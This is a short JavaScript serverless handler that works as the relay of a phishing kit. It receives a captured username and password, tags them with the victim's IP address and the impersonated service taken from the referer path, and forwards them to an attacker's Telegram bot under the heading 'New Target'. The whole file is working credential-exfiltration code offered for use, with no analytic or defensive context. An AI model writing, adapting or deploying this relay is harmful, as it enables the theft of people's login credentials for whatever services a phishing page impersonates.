export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { config, data, service } = req.body;

    // Check if both the Telegram config and the captured data exist
    if (!config || !data) {
        return res.status(400).json({ error: 'Payload missing' });
    }

    try {
        // 1. Decode the Base64 config string
        const sanitizedConfig = config.replace(/ /g, '+');
        let decoded;
        try {
            decoded = JSON.parse(Buffer.from(sanitizedConfig, 'base64').toString());
        } catch (e) {
            return res.status(400).json({ error: 'Invalid configuration format' });
        }

        if (!decoded.t || !decoded.c) {
            return res.status(400).json({ error: 'Incomplete Telegram configuration' });
        }

        // 2. Identify the Source Service
        // Priority: Explicit body param > Referer URL path > Default
        let detectedService = service || "Unknown Platform";
        if (!service && req.headers.referer) {
            const referer = req.headers.referer;
            const match = referer.match(/\/v\/([^/#?]+)/);
            if (match) detectedService = match[1];
        }

        // 3. Extract Client IP
        const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

        // 4. Format the message with the Service Header
        const message = `🎯 <b>New Target [${detectedService.toUpperCase()}]</b>\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `👤 <b>User:</b> <code>${data.User || 'N/A'}</code>\n` +
                        `🔑 <b>Pass:</b> <code>${data.Pass || 'N/A'}</code>\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
                        `🕒 <b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;

        // 5. Dispatch to Telegram
        const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
        
        const response = await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: decoded.c,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (!response.ok) {
            return res.status(502).json({ error: 'Telegram API Error', details: result.description });
        }

        return res.status(200).json({ success: true });
    } catch (err) {
        console.error('Processing Error:', err);
        return res.status(500).json({ error: 'Relay failed to process transmission' });
    }
}
